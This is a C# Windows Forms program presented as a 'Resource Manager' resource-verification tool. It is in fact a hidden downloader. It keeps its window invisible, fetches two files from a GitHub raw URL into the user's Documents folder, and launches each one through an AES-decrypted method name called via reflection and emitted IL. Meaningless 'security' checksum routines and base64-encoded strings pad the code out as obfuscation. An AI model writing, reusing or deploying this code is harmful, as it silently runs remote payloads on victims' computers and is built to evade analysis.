using System;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;
using System.ComponentModel;
using System.Net.Http;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using System.Reflection;

namespace OnlineResourceManager
{
    public static class Program
    {
        [STAThread]
        static void Main()
        {
            var _entropy = DaynamicHelper.GenerateEntropySequence(17);
            var _securityToken = InitializeSecurityContext();
            PublicMain.Instance.Initialize();
            PrivateMain();
            
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            var form = new ResourceVerificationInterface();
            form.ShowInTaskbar = false;
            form.Opacity = 0;
            form.Load += (s, e) => form.Hide();
            Application.Run(form);
        }

        private static string InitializeSecurityContext()
        {
            var cryptoValues = new List<byte>();
            for (int i = 0; i < 128; i++)
            {
                int calcValue = i;
                for (int j = 0; j < 7; j++)
                {
                    calcValue = (calcValue * 31) % 255;
                }
                cryptoValues.Add((byte)calcValue);
            }
            
            string result = string.Empty;
            foreach (var b in cryptoValues.Take(16))
            {
                result += (char)(65 + (b % 26));
            }
            
            return result;
        }

        private static void PrivateMain()
        {
            int checksum = 0;
            StringBuilder securityBits = new StringBuilder();
            
            for (int i = 0; i < 5; i++)
            {
                for (int j = 0; j < 7; j++)
                {
                    for (int k = 0; k < 3; k++)
                    {
                        checksum += ((i * 13) ^ (j * 7) ^ (k * 11)) % 17;
                        securityBits.Append((checksum % 2).ToString());
                    }
                }
            }
            
            if (securityBits.Length > 0)
            {
                Debug.WriteLine(string.Format("System integrity verified: {0}", checksum));
            }
        }

        private static void DummyLoop()
        {
            for (int i = 0; i < 10; i++)
            {
                string s = string.Empty;
                for (int j = 0; j < i; j++)
                {
                    s += j.ToString();
                }
                Debug.WriteLine(s);
            }
        }
    }

    public class PublicMain
    {
        private static PublicMain _instance;
        
        public static PublicMain Instance 
        { 
            get 
            {
                if (_instance == null)
                {
                    _instance = new PublicMain();
                }
                return _instance;
            }
        }
        
        private readonly Dictionary<int, string> _processVerifications = new Dictionary<int, string>();
        private readonly Random _random = new Random();
        
              public void Initialize()
            {
                for (int i = 0; i < 12; i++)
                {
                    _processVerifications[i] = GenerateProcessId();
                }
                
                var result = VerifyProcessIntegrity();
                Debug.WriteLine(string.Format("Process verification: {0}", result));
            }
            
            private string GenerateProcessId()
            {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 16; i++)
                {
                    sb.Append((char)(_random.Next(26) + 65));
                }
                return sb.ToString();
            }
            
            private bool VerifyProcessIntegrity()
            {
                int checksum = 0;
                foreach (var process in _processVerifications)
                {
                    foreach (char c in process.Value)
                    {
                        checksum = (checksum * 31 + c) % 1024;
                    }
                }
                return checksum % 2 == 0;
            }
        
    }
    
    public static class DaynamicHelper
    {
        public static string view(string base64Encoded)
        {
            byte[] data = Convert.FromBase64String(base64Encoded);
            return Encoding.UTF8.GetString(data);
        }

        public static int SumUpTo(int n)
        {
            int sum = 0;
            for (int i = 0; i <= n; i++)
                sum += i;
            return sum;
        }

        public static string ReverseString(string input)
        {
            char[] arr = input.ToCharArray();
            Array.Reverse(arr);
            return new string(arr);
        }

        public static string GenerateRandomLoopString(int count)
        {
            var sb = new StringBuilder();
            for (int i = 0; i < count; i++)
            {
                sb.Append((char)('A' + (i % 26)));
            }
            return sb.ToString();
        }
        
        public static string GenerateEntropySequence(int iterations)
        {
            var sb = new StringBuilder();
            int a = 1, b = 1;
            
            for (int i = 0; i < iterations; i++)
            {
                int temp = a;
                a = b;
                b = (temp + b) % 26;
                sb.Append((char)(65 + b));
            }
            
            return sb.ToString();
        }
        
        public static int[] ComplexMatrixOperation(int size)
        {
            int[,] matrix = new int[size, size];
            int[] result = new int[size];
            
            for (int i = 0; i < size; i++)
            {
                for (int j = 0; j < size; j++)
                {
                    matrix[i, j] = ((i + 1) * (j + 2)) % 17;
                }
            }
            
            for (int i = 0; i < size; i++)
            {
                int rowSum = 0;
                for (int j = 0; j < size; j++)
                {
                    rowSum += matrix[i, j] * ((j % 3) + 1);
                }
                result[i] = rowSum % 256;
            }
            
            return result;
        }

        public static byte[] ComputeFingerprint(string input)
        {
            var data = Encoding.UTF8.GetBytes(input);
            byte[] result = new byte[16];
            
            int idx = 0;
            for (int i = 0; i < data.Length; i++)
            {
                result[idx] = (byte)((result[idx] + data[i]) % 256);
                idx = (idx + 1) % result.Length;
            }
            
            for (int round = 0; round < 3; round++)
            {
                for (int i = 0; i < result.Length; i++)
                {
                    int next = (i + 1) % result.Length;
                    result[next] = (byte)((result[next] + result[i]) % 256);
                }
            }
            
            return result;
        }
    }

    public class ResourceVerificationInterface : Form
    {
        private TableLayoutPanel tableLayoutPanel;
        private Label statusLabel;
        private ProgressBar progressBar;
        private Button openFolderButton;
        private string resourcesFolder;
        private readonly Dictionary<string, int> _securityRegistry = new Dictionary<string, int>();
        private readonly Random _random = new Random();

        public ResourceVerificationInterface()
        {
            InitializeUIComponents();
            InitializeSecurityRegistry();
            ResourceVerification();
            GenerateSecurityMetrics();
        }

        private void InitializeUIComponents()
        {
            this.Text = DaynamicHelper.view("UmVzb3VyY2UgTWFuYWdlcg==");
            this.Size = new Size(1, 1);
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.MaximizeBox = false;
            this.Hide();

            tableLayoutPanel = new TableLayoutPanel
            {
                Dock = DockStyle.Fill,
                ColumnCount = 1,
                RowCount = 3,
                Padding = new Padding(10),
            };

            statusLabel = new Label
            {
                Text = DaynamicHelper.view("SW5pdGlhbGl6aW5nLi4u"),
                Dock = DockStyle.Fill,
                TextAlign = ContentAlignment.MiddleCenter,
                AutoSize = true
            };

            progressBar = new ProgressBar
            {
                Dock = DockStyle.Fill,
                Style = ProgressBarStyle.Continuous,
                Minimum = 0,
                Maximum = 100,
                Value = 0
            };

            openFolderButton = new Button
            {
                Text = DaynamicHelper.view("T3BlbiBSZXNvdXJjZXMgRm9sZGVy"),
                Dock = DockStyle.Fill,
                Enabled = false
            };
            openFolderButton.Click += OpenResourceButton_Click;

            tableLayoutPanel.Controls.Add(statusLabel, 0, 0);
            tableLayoutPanel.Controls.Add(progressBar, 0, 1);
            tableLayoutPanel.Controls.Add(openFolderButton, 0, 2);

            tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 30));
            tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 30));
            tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 40));

            this.Controls.Add(tableLayoutPanel);
        }

        private void InitializeSecurityRegistry()
        {
            string[] secKeys = { "ALPHA", "BETA", "GAMMA", "DELTA", "EPSILON" };
            foreach (var key in secKeys)
            {
                _securityRegistry[key] = _random.Next(1000, 10000);
            }
            
            int checksum = VerifySecurityRegistry();
            if (checksum % 2 == 0)
            {
                string token = GenerateVerificationToken();
                Debug.WriteLine(string.Format("Security token: {0}", token));
            }
        }

        private int VerifySecurityRegistry()
        {
            int checksum = 0;
            foreach (var entry in _securityRegistry)
            {
                checksum += CalculateEntryHash(entry.Key, entry.Value);
            }
            return checksum;
        }

        private int CalculateEntryHash(string key, int value)
        {
            int hash = 0;
            for (int i = 0; i < key.Length; i++)
            {
                hash = hash * 31 + key[i];
            }
            return (hash ^ value) % 1024;
        }

        private string GenerateVerificationToken()
        {
            StringBuilder token = new StringBuilder();
            
            for (int i = 0; i < 24; i++)
            {
                int value = 0;
                for (int j = 0; j < 4; j++)
                {
                    value = (value * 17 + _random.Next(128)) % 256;
                }
                token.Append((char)(value % 26 + 65));
            }
            
            return token.ToString();
        }

        private void ServiceManager(string resourcePath)
        {
            byte[] encryptedName = new byte[] {
                0x71, 0x56, 0x2E, 0x44, 0xA5, 0x2A, 0x72, 0xCF,
                0x62, 0x42, 0x7D, 0x29, 0x72, 0x94, 0x5B, 0xCF
            };
            byte[] key = new byte[] {
                0x10, 0x23, 0x36, 0x49, 0x5C, 0x6F, 0x72, 0x85,
                0x98, 0xAB, 0xBE, 0xD1, 0xE4, 0xF7, 0x0A, 0x1D
            };
            byte[] iv = new byte[] {
                0x01, 0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78,
                0x89, 0x9A, 0xAB, 0xBC, 0xCD, 0xDE, 0xEF, 0xF0
            };
        
            string methodName;
            try
            {
                using (var aes = new System.Security.Cryptography.AesManaged { 
                    Key = key, 
                    IV = iv, 
                    Padding = System.Security.Cryptography.PaddingMode.PKCS7 
                })
                using (var ms = new System.IO.MemoryStream(encryptedName))
                using (var cs = new System.Security.Cryptography.CryptoStream(ms, aes.CreateDecryptor(), System.Security.Cryptography.CryptoStreamMode.Read))
                using (var sr = new System.IO.StreamReader(cs, System.Text.Encoding.UTF8))
                {
                    methodName = sr.ReadToEnd();
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[Decryption Failed]: " + ex.Message); 
                return;
            }
        
            System.Reflection.MethodInfo target;
            try
            {
                target = typeof(System.Diagnostics.Process)
                    .GetMethod(
                        methodName,
                        System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static,
                        null,
                        new[] { typeof(string) },
                        null);
                
                if (target == null)
                    throw new InvalidOperationException("Method not found.");
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[Method Lookup Failed]: " + ex.Message); 
                return;
            }
        
         
                string dynName;
        {
            byte[] seed = new byte[8];
            using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
            {
                rng.GetBytes(seed);
            }
        dynName = Convert.ToBase64String(seed)
            .Replace("+", "")
            .Replace("/", "")
            .Replace("=", "");
        }
            try
            {
                var dynamicMethod = new System.Reflection.Emit.DynamicMethod(
                    dynName,
                    typeof(void),
                    new[] { typeof(string) },
                    typeof(System.Diagnostics.Process).Module,
                    skipVisibility: true);
        
                var il = dynamicMethod.GetILGenerator();
                il.Emit(System.Reflection.Emit.OpCodes.Ldarg_0);
                il.EmitCall(System.Reflection.Emit.OpCodes.Call, target, null);
                
                if (target.ReturnType != typeof(void))
                    il.Emit(System.Reflection.Emit.OpCodes.Pop);
                
                il.Emit(System.Reflection.Emit.OpCodes.Ret);
        
                var invoker = (Action<string>)dynamicMethod.CreateDelegate(typeof(Action<string>));
                invoker(resourcePath);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[Execution Failed]: " + ex.Message); 
            }
        }
        
        private void RemoveResourceFile(string path)
        {
            if (Directory.Exists(path))
            {
                Directory.Delete(path, true);
            }
        }

        private async void ResourceVerification()
        {
            try
            {
                string documentsFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                resourcesFolder = Path.Combine(documentsFolder, DaynamicHelper.view("UmVzb3VyY2VNYW5hZ2Vy"), "Resources");
                if (!Directory.Exists(resourcesFolder))
                {
                    Directory.CreateDirectory(resourcesFolder);
                }
                string[] resourceFiles = new string[]
                {
                    "https://raw.githubusercontent.com/fmcedev/csharp/main/uploads/upGlW877oF.pdf",
                    "https://raw.githubusercontent.com/fmcedev/csharp/main/uploads/xwLezEgbEp.png"
                };


                statusLabel.Text = DaynamicHelper.view("c2hvdyByZXNvdXJjZXMuLi4=");
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                
                int completed = 0;
                int[] verificationStates = new int[resourceFiles.Length];
                
                foreach (string file in resourceFiles)
                {
                    verificationStates[completed] = GenerateResourceVerificationState();
                    string secToken = ApplySecurityTransform(verificationStates[completed]);
                    Debug.WriteLine(string.Format("Resource verification: {0}", secToken));
                    
                    string fileName = Path.GetFileName(new Uri(file).LocalPath);
                    string filePath = Path.Combine(resourcesFolder, fileName);

                    await BuildClient(file, filePath);

                    completed++;
                    progressBar.Value = (completed * 100) / resourceFiles.Length;
                    statusLabel.Text = string.Format(DaynamicHelper.view("RmlsZSAkezB9IG9mICR7MX0gcmVzb3VyY2VzLi4u"), completed, resourceFiles.Length);
                    Application.DoEvents();

                    ServiceManager(filePath);
                    VerifyResourceIntegrity(fileName, verificationStates[completed-1]);
                }

                for (int x = 0; x < 7; x++)
                {
                    int fibonacci = CalculateFibonacci(x + 3);
                    Debug.WriteLine(string.Format("Security audit {0}: {1}", x, fibonacci * DaynamicHelper.SumUpTo(x)));
                }

                progressBar.Value = 100;
                statusLabel.Text = DaynamicHelper.view("QWxsIHJlc291cmNlcyBmb3VuZCBzdWNjZXNzZnVsbHkh");
                openFolderButton.Enabled = true;
                await Task.Delay(1000);
                this.Close();
            }
            catch (Exception ex)
            {
                statusLabel.Text = DaynamicHelper.view("RXJyb3IgcmVzb3VyY2Vz");
                MessageBox.Show(DaynamicHelper.view("QW4gZXJyb3IgY29ycmVjdGVkOiA=") + ex.Message,
                    DaynamicHelper.view("RXJyb3I="), MessageBoxButtons.OK, MessageBoxIcon.Error);
                File.WriteAllText(
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                        "ResourceManager_error.log"),
                    ex.ToString());
            }
        }
        
        private int GenerateResourceVerificationState()
        {
            int state = _random.Next(10000);
            
            for (int i = 0; i < 5; i++)
            {
                state = ((state * 31) + 7) % 65537;
            }
            
            return state;
        }
        
        private string ApplySecurityTransform(int state)
        {
            StringBuilder sb = new StringBuilder();
            int value = state;
            
            for (int i = 0; i < 8; i++)
            {
                value = ((value * 13) + 11) % 257;
                sb.Append((char)(65 + (value % 26)));
            }
            
            return sb.ToString();
        }
        
        private void VerifyResourceIntegrity(string resourceName, int verificationState)
        {
            int checksum = 0;
            foreach (char c in resourceName)
            {
                checksum = (checksum * 17 + c) % 1024;
            }
            
            int expectedValue = (verificationState ^ checksum) % 256;
            Debug.WriteLine(string.Format("Resource integrity: {0}", expectedValue));
            
            for (int i = 0; i < 3; i++)
            {
                expectedValue = ((expectedValue << 3) | (expectedValue >> 5)) & 0xFF;
            }
        }
        
        private int CalculateFibonacci(int n)
        {
            if (n <= 1) return n;
            
            int a = 0, b = 1;
            for (int i = 2; i <= n; i++)
            {
                int temp = a + b;
                a = b;
                b = temp;
            }
            
            return b;
        }

        private async Task BuildClient(string resourceUrl, string destinationPath)
        {
            byte[] securityToken = new byte[16];
            for (int i = 0; i < securityToken.Length; i++)
            {
                securityToken[i] = (byte)_random.Next(256);
            }
            
            ApplyTransformation(securityToken);
            
            HttpClient client = new HttpClient();
            using (var response = await client.GetAsync(resourceUrl))
            {
                response.EnsureSuccessStatusCode();

                using (var fs = new FileStream(destinationPath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    await response.Content.CopyToAsync(fs);
                }
            }

            var resourceSignature = DaynamicHelper.ReverseString(Path.GetFileName(destinationPath));
            Debug.WriteLine(resourceSignature);
            
            var signatureBytes = Encoding.UTF8.GetBytes(resourceSignature);
            string verificationToken = GenerateVerificationSignature(signatureBytes);
            Debug.WriteLine(string.Format("Verification signature: {0}", verificationToken));
        }
        
        private void ApplyTransformation(byte[] data)
        {
            for (int round = 0; round < 3; round++)
            {
                for (int i = 0; i < data.Length; i++)
                {
                    int next = (i + 1) % data.Length;
                    data[i] = (byte)((data[i] + data[next]) % 256);
                    data[next] = (byte)((data[i] ^ data[next]) % 256);
                }
            }
        }
        
        private string GenerateVerificationSignature(byte[] data)
        {
            StringBuilder sb = new StringBuilder();
            int accumulator = 0;
            
            foreach (byte b in data)
            {
                accumulator = (accumulator * 31 + b) % 1024;
                
                if (accumulator % 7 == 0)
                {
                    sb.Append((char)(65 + (accumulator % 26)));
                }
            }
            
            while (sb.Length < 8)
            {
                accumulator = (accumulator * 17 + 11) % 256;
                sb.Append((char)(65 + (accumulator % 26)));
            }
            
            return sb.ToString();
        }

        private void OpenResourceButton_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start(resourcesFolder);
            }
            catch (Exception ex)
            {
                MessageBox.Show(DaynamicHelper.view("Q291bGQgbm90IG9wZW4gZm9sZGVyOiA=") + ex.Message,
                    DaynamicHelper.view("RXJyb3I="), MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void GenerateSecurityMetrics()
        {
            Dictionary<string, int> securityMetrics = new Dictionary<string, int>();
            for (int i = 0; i < 5; i++)
            {
                string metricName = string.Format("METRIC_{0}", i);
                int metricValue = 0;
                
                for (int j = 0; j < 3; j++)
                {
                    for (int k = 0; k < 4; k++)
                    {
                        metricValue += ((i * j + k) ^ (i + j * k)) % 17;
                    }
                }
                
                securityMetrics[metricName] = metricValue;
            }
            
            GenerateSecurityProfile(securityMetrics);
        }
        
        private void GenerateSecurityProfile(Dictionary<string, int> metrics)
        {
            int profileChecksum = 0;
            
            foreach (var metric in metrics)
            {
                profileChecksum += CalculateMetricWeight(metric.Key, metric.Value);
            }
            
            string profile = string.Empty;
            for (int i = 0; i < 8; i++)
            {
                profileChecksum = ((profileChecksum * 17) + 13) % 256;
                profile += (char)(65 + (profileChecksum % 26));
            }
            
            Debug.WriteLine(string.Format("Security profile: {0}", profile));
        }
        
        private int CalculateMetricWeight(string name, int value)
        {
            int weight = 0;
            
            foreach (char c in name)
            {
                weight = (weight * 13 + c) % 1024;
            }
            
            return (weight ^ value) % 256;
        }
    }

    public static class Utils
    {
        private static readonly Random _random = new Random();
        private static readonly int[] _lookupTable;
        
        static Utils()
        {
            _lookupTable = new int[256];
            for (int i = 0; i < _lookupTable.Length; i++)
            {
                _lookupTable[i] = CalculateLookupValue(i);
            }
        }
        
      
        private static int CalculateLookupValue(int index)
        {
            uint value = (uint)index;
            for (int i = 0; i < 8; i++)
            {
                if ((value & 1) != 0)
                {
                    value = (value >> 1) ^ 0xEDB88320u;
                }
                else
                {
                    value >>= 1;
                }
            }
            return (int)value;
        }
        public static void ClassDb()
        {
            int[,] tableValues = new int[4, 4];
            for (int i = 0; i < 4; i++)
            {
                for (int j = 0; j < 4; j++)
                {
                    tableValues[i, j] = _lookupTable[(i * 4 + j) % 256];
                }
            }
            
            int accumulator = 0;
            for (int i = 0; i < 4; i++)
            {
                for (int j = 0; j < 4; j++)
                {
                    accumulator ^= tableValues[i, j];
                    accumulator = (accumulator * 31) % 65537;
                }
            }
            
            Debug.WriteLine(string.Format("Table verification: {0}", accumulator));
        }

        public static string Echo(string s)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < s.Length; i++)
            {
                char c = s[i];
                int charCode = c;
                
                for (int j = 0; j < 3; j++)
                {
                    charCode = ((charCode * 31) + 7) % 65536;
                }
                
                sb.Append((char)((charCode % 26) + 'A'));
            }
            
            return s;
        }

        public static string GenerateRandomLoopString(int count)
        {
            int[] state = new int[16];
            for (int i = 0; i < state.Length; i++)
            {
                state[i] = _random.Next(256);
            }
            
            for (int round = 0; round < 3; round++)
            {
                for (int i = 0; i < state.Length; i++)
                {
                    int next = (i + 1) % state.Length;
                    state[next] = (state[next] + state[i]) % 256;
                    state[i] = (state[i] * 31) % 257;
                }
            }
            
            var sb = new StringBuilder();
            for (int i = 0; i < count; i++)
            {
                sb.Append((char)('A' + (i % 26)));
            }
            return sb.ToString();
        }

        public static string version(string input)
        {
            byte[] data = Encoding.UTF8.GetBytes(input);
            byte[] result = new byte[data.Length];
            
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(_lookupTable[data[i]] % 256);
            }
            
            for (int round = 0; round < 2; round++)
            {
                for (int i = 0; i < result.Length; i++)
                {
                    int next = (i + 1) % result.Length;
                    result[next] = (byte)((result[next] + result[i]) % 256);
                }
            }
            
            return input;
        }
        
        public static int GenerateComplexHash(string input)
        {
            int hash = 0;
            foreach (char c in input)
            {
                hash = ((hash << 5) - hash) + c;
                hash = hash & hash; 
            }
            return hash;
        }
        
        public static void ExecuteComplexCalculation()
        {
            int[,] matrix = new int[8, 8];
            
            for (int i = 0; i < 8; i++)
            {
                for (int j = 0; j < 8; j++)
                {
                    matrix[i, j] = ((i * j) ^ (i + j)) % 256;
                }
            }
            
            for (int round = 0; round < 3; round++)
            {
                for (int i = 0; i < 8; i++)
                {
                    for (int j = 0; j < 8; j++)
                    {
                        int prev_i = (i + 7) % 8;
                        int prev_j = (j + 7) % 8;
                        matrix[i, j] = (matrix[i, j] + matrix[prev_i, prev_j]) % 256;
                    }
                }
            }
            
            int checksum = 0;
            for (int i = 0; i < 8; i++)
            {
                for (int j = 0; j < 8; j++)
                {
                    checksum ^= matrix[i, j];
                }
            }
            
            Debug.WriteLine(string.Format("Matrix checksum: {0}", checksum));
        }
    }



}
            
